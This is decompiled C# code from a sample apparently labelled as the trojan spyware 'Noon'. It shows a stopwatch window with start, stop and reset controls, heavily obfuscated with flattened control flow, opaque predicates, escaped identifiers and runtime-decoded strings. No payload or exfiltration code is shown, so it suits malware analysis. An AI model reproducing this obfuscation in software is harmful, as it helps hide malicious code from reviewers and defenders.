// Decompiled with JetBrains decompiler
// Type:  
// Assembly: ProgIdRedirectionEn, Version=1.7.3.0, Culture=neutral, PublicKeyToken=null
// MVID: B81F1514-ABAD-442F-0D6D-30821B04B8DB
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\Trojan-Spy.Win32.Noon.bcqy-84d399a3116d4038d5730fdbae6857142c0141f042dbba9a42e8a21e1ce6448b.exe

using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

public sealed class \u000E\u2000 : Form
{
  private Stopwatch \u0002;
  private bool \u0003;
  private IContainer \u0005;
  private Label \u0008;
  private Button \u0006;
  private Button \u000E;
  private Timer \u000F;

  [MethodImpl(MethodImplOptions.NoInlining)]
  public \u000E\u2000()
  {
    int num1 = 4;
    while (true)
    {
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 4:
            goto label_2;
          case 1:
            this.\u0002 = new Stopwatch();
            this.\u0003 = false;
            num2 = 5;
            continue;
          case 2:
          case 3:
            goto label_3;
          case 5:
            goto label_4;
          case 6:
            goto label_8;
          default:
            goto label_7;
        }
      }
label_2:
      \u0003\u2004.\u0002();
      num1 = 1;
      continue;
label_3:
      this.\u0002();
      num1 = 6;
      continue;
label_4:
      this.\u0005 = (IContainer) null;
      // ISSUE: explicit constructor call
      base.\u002Ector();
      goto label_3;
label_7:
      num1 = 2;
    }
label_8:;
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  private void \u0002(object _param1, EventArgs _param2)
  {
    int num1 = 4;
    if (\u000E\u2000.\u0003())
      ;
    while (true)
    {
      int num2;
      switch (num1)
      {
        case 0:
          this.\u0008.Location = new Point(0, 9);
          goto case 3;
        case 1:
        case 6:
          this.\u000E.Enabled = false;
          this.\u000F.Interval = 10;
          num2 = 9;
          break;
        case 2:
        case 5:
          this.\u0008.BackColor = Color.White;
          this.\u0008.Font = new Font(\u0005\u2007.\u0002(-1359009581), 36f);
          this.\u0008.BorderStyle = BorderStyle.Fixed3D;
          num2 = 0;
          break;
        case 3:
          this.\u0008.Size = new Size(290, 50);
          this.\u0008.TextAlign = ContentAlignment.TopCenter;
          this.\u0008.AutoSize = false;
          num1 = 8;
          continue;
        case 4:
          this.Size = new Size(300, 180);
          num1 = 7;
          continue;
        case 7:
          this.Text = \u0005\u2007.\u0002(-1359009620);
          this.\u0008.Text = this.\u0002.Elapsed.ToString();
          if (!\u000E\u2000.\u0003())
          {
            num1 = 5;
            continue;
          }
          goto case 8;
        case 8:
          this.\u0006.Text = \u0005\u2007.\u0002(-1359009605);
          this.\u0006.Size = new Size(85, 30);
          this.\u0006.Location = new Point(40, 100);
          this.\u000E.Text = \u0005\u2007.\u0002(-1359009654);
          this.\u000E.Size = new Size(85, 30);
          this.\u000E.Location = new Point(160, 100);
          num1 = 1;
          continue;
        case 9:
          goto label_1;
        default:
          num1 = 3;
          continue;
      }
      num1 = num2;
    }
label_1:;
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  private void \u0003(object _param1, EventArgs _param2)
  {
    int num1 = 4;
    while (true)
    {
      int num2 = num1;
      bool flag;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 4:
            goto label_3;
          case 1:
          case 5:
            if (flag)
            {
              this.\u0002.Start();
              this.\u000F.Start();
              this.\u0003 = true;
              num2 = 2;
              continue;
            }
            this.\u0002.Stop();
            this.\u000F.Stop();
            this.\u0003 = false;
            this.\u000E.Enabled = true;
            num2 = 3;
            continue;
          case 2:
            goto label_4;
          case 3:
            goto label_10;
          case 6:
            goto label_8;
          case 7:
            goto label_11;
          default:
            num2 = 6;
            continue;
        }
      }
label_3:
      flag = !this.\u0003;
      num1 = 5;
      continue;
label_10:
      this.\u0006.Text = \u0005\u2007.\u0002(-1359009605);
      num1 = 7;
    }
label_4:
    this.\u000E.Enabled = false;
    this.\u0006.Text = \u0005\u2007.\u0002(-1359009639);
    return;
label_8:
    return;
label_11:;
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  private void \u0005(object _param1, EventArgs _param2)
  {
    this.\u0002.Reset();
    this.\u0008.Text = this.\u0002.Elapsed.ToString();
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  private void \u0008(object _param1, EventArgs _param2) => this.\u0008.Text = this.\u0002.Elapsed.ToString();

  [MethodImpl(MethodImplOptions.NoInlining)]
  protected override void Dispose(bool _param1)
  {
    int num1 = 4;
    while (true)
    {
      int num2;
      switch (num1)
      {
        case 0:
        case 4:
          if (_param1)
          {
            if (\u000E\u2000.\u0002())
            {
              num1 = 3;
              continue;
            }
            goto case 1;
          }
          else
          {
            num2 = 0;
            goto label_7;
          }
        case 1:
        case 3:
          num2 = this.\u0005 != null ? 1 : 0;
          goto label_7;
        case 2:
label_1:
          this.\u0005.Dispose();
          break;
        case 5:
          goto label_8;
        default:
          num1 = 2;
          continue;
      }
label_2:
      base.Dispose(_param1);
      num1 = 5;
      continue;
label_7:
      if (num2 == 0)
        goto label_2;
      else
        goto label_1;
    }
label_8:;
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  private void \u0002()
  {
    int num1 = 0;
    while (true)
    {
      int num2 = num1;
      ComponentResourceManager componentResourceManager;
      while (true)
      {
        switch (num2)
        {
          case 0:
            this.\u0005 = (IContainer) new Container();
            if (\u000E\u2000.\u0002())
            {
              num2 = 12;
              continue;
            }
            goto label_12;
          case 1:
          case 12:
            componentResourceManager = new ComponentResourceManager(typeof (\u000E\u2000));
            num2 = 11;
            continue;
          case 2:
            this.Icon = (Icon) componentResourceManager.GetObject(\u0005\u2007.\u0002(-1359009728));
            this.Margin = new Padding(8, 8, 8, 8);
            num2 = 13;
            continue;
          case 3:
            goto label_4;
          case 4:
            goto label_12;
          case 5:
          case 10:
            this.\u0006.Size = new Size(200, 59);
            if (!\u000E\u2000.\u0003())
            {
              num2 = 3;
              continue;
            }
            goto case 1;
          case 6:
            goto label_13;
          case 7:
            this.\u0008.TabIndex = 0;
            this.\u0008.Text = \u0005\u2007.\u0002(-1359009739);
            this.\u0006.Location = new Point(99, 400);
            this.\u0006.Margin = new Padding(8, 8, 8, 8);
            this.\u0006.Name = \u0005\u2007.\u0002(-1359009711);
            int num3 = 10;
            num2 = \u000E\u2000.\u0003() ? num3 : num3;
            continue;
          case 8:
            goto label_16;
          case 9:
            goto label_2;
          case 11:
            this.\u0008 = new Label();
            this.\u0006 = new Button();
            this.\u000E = new Button();
            this.\u000F = new Timer(this.\u0005);
            this.SuspendLayout();
            this.\u0008.AutoSize = true;
            this.\u0008.Location = new Point(312, 114);
            this.\u0008.Margin = new Padding(8, 0, 8, 0);
            num2 = 6;
            continue;
          case 13:
            goto label_3;
          case 14:
            goto label_15;
          default:
            num2 = 4;
            continue;
        }
      }
label_2:
      this.Text = \u0005\u2007.\u0002(-1359009688);
      this.Load += new EventHandler(this.\u0002);
      this.ResumeLayout(false);
      this.PerformLayout();
      num1 = 14;
      continue;
label_3:
      this.Name = \u0005\u2007.\u0002(-1359009668);
      num1 = 9;
      continue;
label_4:
      this.\u0006.TabIndex = 1;
label_12:
      this.\u0006.Text = \u0005\u2007.\u0002(-1359009711);
      this.\u0006.UseVisualStyleBackColor = true;
      this.\u0006.Click += new EventHandler(this.\u0003);
      this.\u000E.Location = new Point(461, 398);
      this.\u000E.Margin = new Padding(8, 8, 8, 8);
      this.\u000E.Name = \u0005\u2007.\u0002(-1359009753);
      this.\u000E.Size = new Size(200, 59);
      this.\u000E.TabIndex = 2;
      this.\u000E.Text = \u0005\u2007.\u0002(-1359009753);
      this.\u000E.UseVisualStyleBackColor = true;
      this.\u000E.Click += new EventHandler(this.\u0005);
      this.\u000F.Tick += new EventHandler(this.\u0008);
      num1 = 8;
      continue;
label_13:
      this.\u0008.Name = \u0005\u2007.\u0002(-1359009739);
      this.\u0008.Size = new Size(93, 32);
      num1 = 7;
      continue;
label_16:
      this.AutoScaleDimensions = new SizeF(16f, 31f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.ClientSize = new Size(779, 677);
      this.Controls.Add((Control) this.\u000E);
      this.Controls.Add((Control) this.\u0006);
      this.Controls.Add((Control) this.\u0008);
      num1 = 2;
    }
label_15:;
  }

  internal static bool \u0002() => true;

  internal static bool \u0003() => false;
}
